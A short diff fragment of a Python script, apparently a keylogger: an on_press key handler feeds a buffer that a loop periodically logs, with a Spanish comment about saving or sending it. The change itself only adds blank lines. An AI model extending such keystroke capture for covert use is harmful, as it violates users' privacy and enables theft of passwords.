@@ -47,8 +47,11 @@ def on_press(key):
 
 def procesar_buffer():
     while True:
+
         time.sleep(10)  #   Espera 10 segundos
         #ime.sleep(1800) # Espera 10 segundos
+
+
         if buffer:
             # Procesa y vacía el buffer (guarda en archivo, envía, etc.)
             logging.info(''.join(buffer))
